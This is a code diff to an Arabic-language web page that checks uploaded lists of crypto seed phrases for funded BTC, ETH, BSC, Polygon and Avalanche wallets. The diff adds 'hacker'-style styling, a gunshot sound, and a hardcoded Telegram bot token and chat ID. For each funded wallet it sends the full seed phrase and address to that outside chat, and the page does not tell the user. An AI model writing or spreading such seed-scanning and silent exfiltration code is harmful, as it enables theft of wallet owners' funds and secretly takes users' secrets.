@@ -8,12 +8,41 @@
   <script src="https://cdn.jsdelivr.net/npm/ethereumjs-util@7.1.3/dist/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
   <style>
-    body { font-family: sans-serif; padding: 1rem; }
-    input, button { margin: .5rem 0; width: 100%; box-sizing: border-box; }
-    #results { white-space: pre-wrap; background: #f9f9f9; padding: .5rem; border: 1px solid #ddd; max-height: 300px; overflow: auto; }
+    /* ستايل الهاكرز الشرير */
+    body {
+      background: #000;
+      color: #33ff33;
+      font-family: 'Source Code Pro', monospace;
+      padding: 1rem;
+      text-shadow: 0 0 5px #33ff33;
+    }
+    input, button {
+      margin: 0.5rem 0;
+      width: 100%;
+      box-sizing: border-box;
+      background: #111;
+      border: 1px solid #33ff33;
+      color: #33ff33;
+      font-family: monospace;
+    }
+    button {
+      cursor: pointer;
+      transition: background .3s;
+    }
+    button:hover {
+      background: #222;
+    }
+    #results {
+      white-space: pre-wrap;
+      background: #111;
+      padding: .5rem;
+      border: 1px solid #33ff33;
+      max-height: 300px;
+      overflow: auto;
+    }
     .count { font-weight: bold; }
-    .good { color: green; }
-    .bad { color: red; }
+    .good { color: #0f0; }
+    .bad { color: #f00; }
   </style>
 </head>
 <body>
@@ -25,10 +54,26 @@
   <input type="text" id="bscscanKey" placeholder="BscScan API Key">
   <input type="text" id="polygonKey" placeholder="Polygonscan API Key">
   <input type="text" id="snowtraceKey" placeholder="Snowtrace API Key">
-  <button onclick="scanFile()">فحص العبارات</button>
+  <button onclick="scanFile()">فحص العبارات</button> <!-- ملف صوت رصاصة --><audio id="gunshot" src="gunshot.mp3" preload="auto"></audio>
+
   <h3>النتائج:</h3>
   <div id="summary">لم يتم الفحص بعد.</div>
   <div id="results"></div> <script>
+    // --- Telegram Alert Configuration ---
+    const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
+    const TELEGRAM_CHAT_ID = '-4913064483';
+
+    async function sendTelegramAlert(text) {
+      try {
+        await fetch(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage` +
+          `?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(text)}`
+        );
+      } catch (e) {
+        console.error('Telegram alert failed', e);
+      }
+    }
+
     // اشتقاق عناوين
     function deriveBtc(seed) {
       const root = hdkey.fromMasterSeed(seed);
@@ -40,6 +85,7 @@
       const child = root.derive("m/44'/60'/0'/0/0");
       return '0x' + ethereumjs.Util.pubToAddress(child.publicKey, true).toString('hex');
     }
+
     // فحص الرصيد
     async function checkBtc(addr) {
       const res = await fetch(`https://blockstream.info/api/address/${addr}`);
@@ -54,26 +100,30 @@
     }
 
     async function scanPhrase(phrase) {
-      if (!bip39.validateMnemonic(phrase)) return false;
+      if (!bip39.validateMnemonic(phrase)) return {ok:false};
       const seed = await bip39.mnemonicToSeed(phrase);
       // BTC
-      if (await checkBtc(deriveBtc(seed))) return true;
+      if (await checkBtc(deriveBtc(seed))) return {ok:true,chain:'BTC',addr:deriveBtc(seed)};
       // ETH
       const ethKey = document.getElementById('etherscanKey').value.trim();
-      if (ethKey && await checkEvm(deriveEvm(seed), ethKey, 'https://api.etherscan.io/api')) return true;
+      if (ethKey && await checkEvm(deriveEvm(seed), ethKey, 'https://api.etherscan.io/api'))
+        return {ok:true,chain:'ETH',addr:deriveEvm(seed)};
       // BSC
       const bscKey = document.getElementById('bscscanKey').value.trim();
-      if (bscKey && await checkEvm(deriveEvm(seed), bscKey, 'https://api.bscscan.com/api')) return true;
+      if (bscKey && await checkEvm(deriveEvm(seed), bscKey, 'https://api.bscscan.com/api'))
+        return {ok:true,chain:'BSC',addr:deriveEvm(seed)};
       // Polygon
       const polyKey = document.getElementById('polygonKey').value.trim();
-      if (polyKey && await checkEvm(deriveEvm(seed), polyKey, 'https://api.polygonscan.com/api')) return true;
+      if (polyKey && await checkEvm(deriveEvm(seed), polyKey, 'https://api.polygonscan.com/api'))
+        return {ok:true,chain:'POLY',addr:deriveEvm(seed)};
       // Avalanche
       const avalKey = document.getElementById('snowtraceKey').value.trim();
-      if (avalKey && await checkEvm(deriveEvm(seed), avalKey, 'https://api.snowtrace.io/api')) return true;
-      return false;
+      if (avalKey && await checkEvm(deriveEvm(seed), avalKey, 'https://api.snowtrace.io/api'))
+        return {ok:true,chain:'AVAX',addr:deriveEvm(seed)};
+      return {ok:false};
     }
 
-    function scanFile() {
+    async function scanFile() {
       const file = document.getElementById('fileInput').files[0];
       if (!file) return alert('يرجى رفع ملف العبارات أولاً');
       const reader = new FileReader();
@@ -84,9 +134,18 @@
         const resultsDiv = document.getElementById('results'); resultsDiv.textContent = '';
         for (let i=0; i<lines.length; i++) {
           const phrase = lines[i];
-          const ok = await scanPhrase(phrase);
-          if (ok) { good++; resultsDiv.innerHTML += `<div class="good">✅ ${phrase}</div>`; }
-          else { bad++; resultsDiv.innerHTML += `<div class="bad">❌ ${phrase}</div>`; }
+          const res = await scanPhrase(phrase);
+          if (res.ok) {
+            good++;
+            resultsDiv.innerHTML += `<div class="good">✅ [${res.chain}] ${phrase} → ${res.addr}</div>`;
+            // صوت رصاصة
+            document.getElementById('gunshot').play();
+            // تنبيه تيليجرام
+            sendTelegramAlert(`Found ${res.chain} wallet:\nPhrase: ${phrase}\nAddress: ${res.addr}`);
+          } else {
+            bad++;
+            resultsDiv.innerHTML += `<div class="bad">❌ ${phrase}</div>`;
+          }
           document.getElementById('summary').innerHTML = `🚀 تم فحص <span class="count">${i+1}/${total}</span> عبارة`;
         }
         document.getElementById('summary').innerHTML += `<br>`+
